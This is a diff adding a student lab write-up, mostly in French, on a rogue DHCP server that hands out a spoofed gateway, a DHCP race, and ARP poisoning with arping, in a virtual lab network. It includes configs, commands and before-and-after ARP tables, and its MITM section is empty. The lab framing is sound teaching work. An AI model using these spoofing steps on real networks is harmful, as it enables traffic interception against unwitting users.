@@ -525,6 +525,179 @@ lease 10.1.1.11 {
 }
 ```
 
+# Part 4 : real haxor
+
+## 1. DHCP spoofing¶
+## A. Setup
+
+```sh
+#
+# DHCP Server Configuration file.
+#   see /usr/share/doc/dhcp-server/dhcpd.conf.example
+#   see dhcpd.conf(5) man page
+
+# default lease time
+default-lease-time 600;
+# max lease time
+max-lease-time 7200;
+# this DHCP server to be declared valid
+authoritative;
+
+# specify network address and subnetmask
+subnet 10.1.1.0 netmask 255.255.255.0 {
+
+# specify the range of lease IP address
+    range dynamic-bootp 10.1.1.210 10.1.1.250;
+
+    # specify gateway
+    option routers 10.1.1.154;
+}
+[gustave@vbox ~]$ sudo firewall-cmd --add-service=dhcp
+success
+[gustave@vbox ~]$ sudo  firewall-cmd --runtime-to-permanent
+success
+```
+
+🌞 Test !
+
+```sh
+[gustave@vbox ~]$ sudo systemctl stop dhcpd
+[gustave@vbox ~]$ sudo systemctl status dhcpd
+○ dhcpd.service - DHCPv4 Server Daemon
+     Loaded: loaded (/usr/lib/systemd/system/dhcpd.service; enabled; preset: disabled)
+     Active: inactive (dead) since Thu 2026-01-08 02:32:00 CET; 9s ago
+       Docs: man:dhcpd(8)
+             man:dhcpd.conf(5)
+    Process: 837 ExecStart=/usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid $DHCPDAR>
+   Main PID: 837 (code=killed, signal=TERM)
+     Status: "Dispatching packets..."
+        CPU: 26ms
+
+Jan 08 03:25:18 vbox dhcpd[837]: ** Ignoring requests on enp0s3.  If this is not what
+Jan 08 03:25:18 vbox dhcpd[837]:    you want, please write a subnet declaration
+Jan 08 03:25:18 vbox dhcpd[837]:    in your dhcpd.conf file for the network segment
+Jan 08 03:25:18 vbox dhcpd[837]:    to which interface enp0s3 is attached. **
+Jan 08 03:25:18 vbox dhcpd[837]:
+Jan 08 03:25:18 vbox dhcpd[837]: Sending on   Socket/fallback/fallback-net
+Jan 08 03:25:18 vbox dhcpd[837]: Server starting service.
+Jan 08 02:32:00 vbox systemd[1]: Stopping DHCPv4 Server Daemon...
+Jan 08 02:32:00 vbox systemd[1]: dhcpd.service: Deactivated successfully.
+Jan 08 02:32:00 vbox systemd[1]: Stopped DHCPv4 Server Daemon.
+```
+
+-Verifier qu'un VPCS recup bien l'IP
+```sh
+node3> ip dhcp
+DORA IP 10.1.1.212/24 GW 10.1.1.154
+```
+
+-Verif que DHCP srv tourne sur la machine attaquante
+```sh
+[gustave@vbox ~]$ sudo systemctl status dhcpd
+[sudo] password for gustave:
+● dhcpd.service - DHCPv4 Server Daemon
+     Loaded: loaded (/usr/lib/systemd/system/dhcpd.service; enabled; preset: disabled)
+     Active: active (running) since Thu 2026-01-08 02:19:48 CET; 17min ago
+       Docs: man:dhcpd(8)
+             man:dhcpd.conf(5)
+   Main PID: 11620 (dhcpd)
+     Status: "Dispatching packets..."
+      Tasks: 1 (limit: 22979)
+     Memory: 4.7M (peak: 6.7M)
+        CPU: 52ms
+     CGroup: /system.slice/dhcpd.service
+             └─11620 /usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid
+
+Jan 08 02:34:23 vbox dhcpd[11620]: DHCPOFFER on 10.1.1.211 to 00:50:79:66:68:01 (node21) via enp0s9
+Jan 08 02:34:24 vbox dhcpd[11620]: reuse_lease: lease age 61 (secs) under 25% threshold, reply with u>
+Jan 08 02:34:24 vbox dhcpd[11620]: DHCPREQUEST for 10.1.1.211 (10.1.1.154) from 00:50:79:66:68:01 (no>
+Jan 08 02:34:24 vbox dhcpd[11620]: DHCPACK on 10.1.1.211 to 00:50:79:66:68:01 (node21) via enp0s9
+Jan 08 02:34:31 vbox dhcpd[11620]: reuse_lease: lease age 53 (secs) under 25% threshold, reply with u>
+Jan 08 02:34:31 vbox dhcpd[11620]: DHCPDISCOVER from 00:50:79:66:68:04 (node31) via enp0s9
+Jan 08 02:34:31 vbox dhcpd[11620]: DHCPOFFER on 10.1.1.212 to 00:50:79:66:68:04 (node31) via enp0s9
+Jan 08 02:34:32 vbox dhcpd[11620]: reuse_lease: lease age 54 (secs) under 25% threshold, reply with u>
+Jan 08 02:34:32 vbox dhcpd[11620]: DHCPREQUEST for 10.1.1.212 (10.1.1.154) from 00:50:79:66:68:04 (no>
+Jan 08 02:34:32 vbox dhcpd[11620]: DHCPACK on 10.1.1.212 to 00:50:79:66:68:04 (node31) via enp0s9
+```
+ca tourne impec
+
+## B. Race !
+➜ Now race !
+
+```sh
+-node1:
+node1> ip dhcp
+DORA IP 10.1.1.210/24 GW 10.1.1.154
+
+-node2
+node2> ip dhcp
+DORA IP 10.1.1.211/24 GW 10.1.1.154
+
+-node3
+node3> ip dhcp
+DORA IP 10.1.1.11/24 GW 10.1.1.253
+
+-node4 (new)
+node4> ip dhcp
+DDORA IP 10.1.1.214/24 GW 10.1.1.154
+
+-node5 (new)
+node5> ip dhcp
+DDORA IP 10.1.1.213/24 GW 10.1.1.154
+
+SYMPA DHCP RACE ( win de dhcp-efrei)
+```
+
+➜ Wireshark this please
+
+
+## 3. ARP poisoning
+
+- Avant l'attaque
+  ```sh
+ node1> show arp
+
+    00:50:79:66:68:03  10.1.1.213 expires in 19 seconds
+    00:50:79:66:68:04  10.1.1.212 expires in 66 seconds
+
+  ```
+```sh
+[gustave@vbox ~]$ sudo arping -I eth2 -S 10.1.1.212 -s 00:de:ad:be:ef:00 -c 8 10.1.1.216
+ - I definit l'interface réseau eth2, -S definit l'Ip source usurpé qui est node3, -s (source MAC - minuscule) : définit la MAC source usurpée, -c (Count) : définit le nombre de paquets à envoyer et à la fin l'IP cible node1
+
+# Résultat console :
+ARPING 10.1.1.216
+Timeout
+...
+8 packets transmitted, 0 packets received, 100% unanswered (0 extra)
+
+----- 10.1.1.216 statistics----
+```
+
+-Après l'attaque:
+```sh
+node1> show arp
+
+00:de:ad:be:ef:00  10.1.1.212 expires in 117 seconds
+00:50:79:66:68:04  10.1.1.212 expires in 115 seconds
+
+```
+
+➜ Wireshark this
+Dispo dans 📁 p4_poisoning.pcap
+
+
+## B. MITM
+
+
+
+
+
+
+
+
+
+
 
 
 
